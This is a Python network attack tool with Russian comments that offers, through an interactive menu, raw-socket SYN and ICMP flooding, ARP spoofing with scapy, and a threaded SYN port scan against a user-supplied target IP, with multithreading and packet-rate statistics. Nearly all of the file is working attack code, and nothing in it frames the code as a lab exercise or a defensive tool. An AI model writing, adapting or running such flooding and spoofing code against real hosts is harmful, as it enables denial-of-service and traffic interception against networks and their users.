from scapy.all import sr, IP, TCP
import scapy.all as scapy
import logging, sys, psutil, socket, random, struct, threading, time

# Настройка логгирования для отслеживания информации о выполнении скрипта
logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Глобальные переменные для подсчета статистики отправленных пакетов и времени
global_packet_count = 0
global_start_time = time.time()
global_lock = threading.Lock()

# Функция для получения списка сетевых интерфейсов на машине
def list_network_interfaces():
    interfaces = psutil.net_if_addrs()
    return [interface for interface in interfaces.keys()]

# Функция для выбора сетевого интерфейса пользователем
def choose_interface():
    interfaces = list_network_interfaces()
    if not interfaces:
        logger.error("No network interfaces found.")
        sys.exit(1)

    logger.info("Available network interfaces:")
    for idx, iface in enumerate(interfaces):
        logger.info(f"{idx}: {iface}")

    try:
        selected_idx = int(input("Select an interface by number (default 0): ") or "0")
        if selected_idx < 0 or selected_idx >= len(interfaces):
            raise ValueError("Selected interface index is out of range.")
        interface = interfaces[selected_idx]
    except ValueError as e:
        logger.error(f"Invalid input: {e}")
        sys.exit(1)

    return interface

# Функция для получения локального IP-адреса машины
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Попытка "подключения" к публичному DNS-серверу для определения IP
        s.connect(('8.8.8.8', 1))
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = '127.0.0.1'  # В случае ошибки возвращаем localhost
    finally:
        s.close()
    return local_ip

# Функция для создания чек-суммы пакета (используется для создания заголовков)
def checksum(msg):
    s = 0
    # Проходим по сообщению блоками по 2 байта и суммируем их
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
        s = s + w
    # Складываем старшие и младшие биты, затем инвертируем биты суммы
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

# Функция для создания IP заголовка с заданными параметрами
def create_ip_header(source_ip, dest_ip, proto, total_length):
    # Инициализация переменных для различных полей IP заголовка
    ip_ihl = 5  # Длина заголовка в 32-битных словах (5 слов = 20 байт)
    ip_ver = 4  # Версия IP (IPv4)
    ip_tos = 0  # Тип обслуживания (обычно 0, если нет специфических требований)
    ip_tot_len = total_length  # Общая длина пакета (IP заголовок + данные)
    ip_id = random.randint(1488, 65535)  # Уникальный идентификатор пакета для фрагментации
    ip_frag_off = 0  # Смещение фрагмента (0 для нефрагментированных пакетов)
    ip_ttl = 64  # Время жизни пакета (TTL)
    ip_proto = proto  # Протокол верхнего уровня (TCP, UDP и т.д.)
    ip_check = 0  # Контрольная сумма заголовка (вычисляется позже)
    ip_saddr = socket.inet_aton(source_ip)  # IP-адрес отправителя
    ip_daddr = socket.inet_aton(dest_ip)  # IP-адрес получателя

    # Сборка версии IP и длины заголовка в одно поле
    ip_ihl_ver = (ip_ver << 4) + ip_ihl

    # Упаковка полей заголовка в бинарный формат согласно стандарту
    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, 
                            ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
    return ip_header

# Функция для создания TCP заголовка с заданными параметрами
def create_tcp_header(source_ip, dest_ip, dest_port):
    # Инициализация переменных для различных полей TCP заголовка
    tcp_source = random.randint(1025, 65535)  # Случайный исходный порт
    tcp_dest = dest_port  # Целевой порт для соединения
    tcp_seq = random.randint(1488, 4294967295)  # Номер последовательности (случайный)
    tcp_ack_seq = 0  # Номер подтверждения (0 для SYN пакета)
    tcp_doff = 5  # Размер заголовка в 32-битных словах (5 слов = 20 байт)
    tcp_flags = 2  # Флаги (SYN флаг для установления соединения)
    tcp_window = socket.htons(5840)  # Размер окна (максимальный по умолчанию)
    tcp_check = 0  # Контрольная сумма (вычисляется позже)
    tcp_urg_ptr = 0  # Указатель срочности (не используется)

    # Сборка полей смещения и зарезервированных битов в одно поле
    tcp_offset_res = (tcp_doff << 4) + 0

    # Создание заголовка TCP без контрольной суммы для вычисления контрольной суммы
    tcp_header = struct.pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                             tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)

    # Псевдозаголовок для расчета контрольной суммы TCP
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    
    psh = struct.pack('!4s4sBBH', socket.inet_aton(source_ip), socket.inet_aton(dest_ip),
                      placeholder, protocol, tcp_length)
    psh = psh + tcp_header

    tcp_check = checksum(psh)
    
    # Переупаковка заголовка TCP с вычисленной контрольной суммой
    tcp_header = struct.pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                             tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)

    return tcp_header

# Функция для создания ICMP заголовка с заданными параметрами
def create_icmp_header(data_size):
    # Инициализация переменных для различных полей ICMP заголовка
    icmp_type = 8  # Тип сообщения (8 для Echo Request)
    icmp_code = 0  # Код (0 для Echo Request)
    icmp_checksum = 0  # Контрольная сумма (вычисляется позже)
    icmp_id = random.randint(1488, 65535)  # Идентификатор (случайный)
    icmp_seq = 1  # Номер последовательности (обычно начинается с 1)

    # Добавляем данные, чтобы достичь требуемого размера пакета
    data = (data_size - 8) * "Q"  # 8 байтов отводится под заголовок ICMP
    data = bytes(data, 'utf-8')

    # Упаковка полей заголовка в бинарный формат
    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq) + data
    icmp_checksum = checksum(icmp_header)
    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq) + data

    return icmp_header


# Функция для создания ICMP пакета (Echo Request)
def create_icmp_packet():
    # Определение типа ICMP пакета (8 - Echo Request)
    icmp_type = 8
    # Код ICMP для Echo Request всегда 0
    icmp_code = 0
    # Начальное значение контрольной суммы - 0, будет вычислено позже
    icmp_checksum = 0
    # Случайный идентификатор для ICMP пакета
    icmp_id = random.randint(1488, 65535)
    # Номер последовательности в ICMP пакете, начинаем с 0
    icmp_seq = 0

    # Упаковка заголовка ICMP без контрольной суммы
    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
    # Вычисление контрольной суммы ICMP пакета
    icmp_checksum = checksum(icmp_header)
    # Переупаковка заголовка ICMP с вычисленной контрольной суммой
    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)

    return icmp_header

# Функция для выполнения SYN Flood атаки с использованием raw sockets
def perform_syn_flood_raw(target_ip, target_port, stop_event):
    global global_packet_count
    # Получение исходного IP-адреса для подделки исходящих пакетов
    source_ip = get_local_ip()
    try:
        # Создание сокета с возможностью указать IP заголовок
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        # Установка опции для включения IP заголовка в пакет
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        # Цикл отправки SYN пакетов до получения сигнала остановки
        while not stop_event.is_set():
            # Создание IP заголовка для пакета
            ip_header = create_ip_header(source_ip, target_ip, socket.IPPROTO_TCP, 40)  # 20 bytes IP + 20 bytes TCP
            # Создание TCP заголовка для пакета
            tcp_header = create_tcp_header(source_ip, target_ip, target_port)
            # Формирование пакета путем конкатенации заголовков
            packet = ip_header + tcp_header
            # Отправка сформированного пакета
            s.sendto(packet, (target_ip, 0))
            # Блокировка и обновление глобального счетчика пакетов
            with global_lock:
                global_packet_count += 1
    finally:
        # Закрытие сокета после остановки цикла отправки пакетов
        s.close()

# Функция для выполнения ICMP Flood атаки с использованием raw sockets
def perform_icmp_flood_raw(target_ip, data_size, stop_event):
    global global_packet_count
    # Получение исходного IP-адреса для подделки исходящих пакетов
    source_ip = get_local_ip()
    try:
        # Создание сокета с возможностью указать IP заголовок
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        # Установка опции для включения IP заголовка в пакет
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        # Цикл отправки ICMP пакетов до получения сигнала остановки
        while not stop_event.is_set():
            # Расчет общей длины пакета
            total_length = 20 + 8 + data_size - 8  # IP header + ICMP header + data
            # Создание IP заголовка для пакета
            ip_header = create_ip_header(source_ip, target_ip, socket.IPPROTO_ICMP, total_length)
            # Создание ICMP заголовка для пакета
            icmp_header = create_icmp_header(data_size)
            # Формирование пакета путем конкатенации заголовков
            packet = ip_header + icmp_header
            # Отправка сформированного пакета
            s.sendto(packet, (target_ip, 0))
            # Блокировка и обновление глобального счетчика пакетов
            with global_lock:
                global_packet_count += 1
    finally:
        # Закрытие сокета после остановки цикла отправки пакетов
        s.close()

#---------- старые функции, сейчас рисуем пакет на низком уровне для оптимизации создания пакета, scapy делает это долго ----------- 
# def perform_syn_flood(target_ip, target_port, stop_event):
#     global global_packet_count, global_lock
#     while not stop_event.is_set():
#         scapy.send(scapy.IP(dst=target_ip)/scapy.TCP(dport=target_port, flags="S"), verbose=0)
#         with global_lock:
#             global_packet_count += 1

# def perform_icmp_flood(target_ip, stop_event):
#     global global_packet_count, global_lock
#     while not stop_event.is_set():
#         scapy.send(scapy.IP(dst=target_ip)/scapy.ICMP(), verbose=0)
#         with global_lock:
#             global_packet_count += 1

# Функция для выполнения ARP Spoofing атаки
def perform_arp_spoofing(target_ip, fake_ip, interface, stop_event):
    # Счетчик отправленных ARP пакетов
    packet_count = 0
    # Засекаем время начала атаки
    start_time = time.time()
    # Цикл отправки поддельных ARP ответов до получения сигнала остановки
    while not stop_event.is_set():
        # Отправка поддельного ARP ответа, указывающего, что fake_ip ассоциирован с MAC-адресом атакующего
        scapy.send(scapy.ARP(op=2, pdst=target_ip, psrc=fake_ip), iface=interface, verbose=0)
        # Увеличение счетчика пакетов
        packet_count += 1
        # Вывод статистики каждые 1000 пакетов
        if packet_count % 1000 == 0:
            # Вычисление текущего времени и времени, прошедшего с начала атаки
            current_time = time.time()
            elapsed_time = current_time - start_time
            # Вычисление скорости отправки пакетов
            packets_per_second = packet_count / elapsed_time if elapsed_time > 0 else 0
            # Логирование статистики
            logger.info(f"[{threading.current_thread().name}] Packets sent: {packet_count} at {packets_per_second:.2f} packets/second")

# Функция для выполнения сканирования портов
def perform_port_scan(target_ip, start_port, end_port, stop_event, open_ports):
    # Цикл перебора портов в заданном диапазоне
    for port in range(start_port, end_port + 1):
        # Прерывание сканирования, если получен сигнал остановки
        if stop_event.is_set():
            return
        # Отправка SYN пакета и ожидание ответа
        response = sr(IP(dst=target_ip) / TCP(dport=port, flags="S"), timeout=1, verbose=0)
        # Обработка ответов
        for sent, received in response[0]:  # response[0] содержит пары отправленных и полученных пакетов
            # Проверка флагов SYN и ACK в ответе, что указывает на открытый порт
            if received.haslayer(TCP) and received.getlayer(TCP).flags & 0x12:
                # Добавление порта в глобальный список открытых портов
                with global_lock:
                    open_ports.add(port)
    # После завершения сканирования увеличиваем счетчик завершенных потоков сканирования
    with global_lock:
        global open_ports_scanned
        open_ports_scanned += 1

# Функция для запуска потока атаки
def attack_thread(attack_function, *args):
    # Бесконечный цикл вызова функции атаки
    while True:
        attack_function(*args)

# Функция для отображения статистики атаки
def display_statistics(stop_event):
    previous_time = time.time()
    previous_packet_count = 0
    # Цикл для отображения статистики до получения сигнала остановки
    while not stop_event.is_set():
        # Блокировка для безопасного доступа к глобальному счетчику пакетов
        with global_lock:
            current_time = time.time()
            elapsed_time = current_time - previous_time
            packets_since_last = global_packet_count - previous_packet_count
            # Расчет скорости отправки пакетов в секунду
            packets_per_second = packets_since_last / elapsed_time if elapsed_time > 0 else 0
            logger.info(f"Packets sent in the last {elapsed_time:.2f} seconds: {packets_since_last}, {packets_per_second:.2f} packets/second")
            previous_time = current_time
            previous_packet_count = global_packet_count
        # Пауза в цикле для уменьшения нагрузки на процессор
        time.sleep(1)

# Основной блок скрипта
if __name__ == "__main__":
    # Запрос параметров атаки от пользователя
    local_ip = get_local_ip()
    print(f'Local IP: {local_ip}')
    target_ip = input("Enter the target IP address: ")
    attack_type = input("Choose the type of attack [syn, icmp, arp, scan]: ")
    num_threads = int(input("Enter the number of threads for the attack: "))
    open_ports = set()  # Используем множество для хранения открытых портов
    global open_ports_scanned
    open_ports_scanned = 0  # Счетчик для отслеживания завершения сканирования портов

    # Список потоков и событие остановки
    threads = []
    stop_event = threading.Event()

    # Создание потоков в зависимости от выбранного типа атаки
    if attack_type == 'syn':
        target_port = int(input("Enter the target port for SYN Flood: "))
        for i in range(num_threads):
            thread = threading.Thread(target=perform_syn_flood_raw, args=(target_ip, target_port, stop_event))
            threads.append(thread)
    elif attack_type == 'icmp':
        data_size = int(input("Enter the size of ICMP packet data (default 56, max 1472 for MTU = 1500): ") or "56")
        for i in range(num_threads):
            thread = threading.Thread(target=perform_icmp_flood_raw, args=(target_ip, data_size, stop_event))
            threads.append(thread)
    elif attack_type == 'arp':
        fake_ip = input("Enter the fake IP address for ARP Spoofing: ")
        interface = choose_interface()
        for i in range(num_threads):
            thread = threading.Thread(target=perform_arp_spoofing, args=(target_ip, fake_ip, interface, stop_event))
            threads.append(thread)
    elif attack_type == 'scan':
        start_port = int(input("Enter the start port for Port Scan: "))
        end_port = int(input("Enter the end port for Port Scan: "))
        for i in range(num_threads):
            thread = threading.Thread(target=perform_port_scan, args=(target_ip, start_port+i, end_port, stop_event, open_ports))
            threads.append(thread)
            thread.start()
        while open_ports_scanned < num_threads:
            time.sleep(0.1)  # Чтобы избежать чрезмерной нагрузки на CPU
        stop_event.set()  # Останавливаем все потоки после завершения сканирования
        for thread in threads:
            thread.join()
        if open_ports:
            logger.info(f"Open ports: {', '.join(str(port) for port in sorted(open_ports))}")
        else:
            logger.info("No open ports found.")
    else:
        logger.error("Invalid attack type selected.")
        sys.exit(1)

    # Запуск потоков атаки
    for thread in threads:
        thread.start()
        logger.info(f"Thread {thread.name} started")

    # Создание и запуск потока для отображения статистики
    statistics_thread = threading.Thread(target=display_statistics, args=(stop_event,))
    statistics_thread.start()

    try:
        # Ожидание команды от пользователя для остановки атаки
        input("Press Enter to stop the attack\n")
    except KeyboardInterrupt:
        logger.info("Attack stopped by user.")

    # Установка события остановки для всех потоков и ожидание их завершения
    stop_event.set()
    for thread in threads:
        thread.join()
        logger.info(f"Thread {thread.name} stopped")

    # Остановка потока статистики и ожидание его завершения
    statistics_thread.join()
    logger.info("Statistics thread stopped.")

    # Вывод итоговой статистики
    total_packets_sent = global_packet_count
    total_time_elapsed = time.time() - global_start_time
    logger.info(f"Attack finished. Total packets sent: {total_packets_sent} in {total_time_elapsed:.2f} seconds.")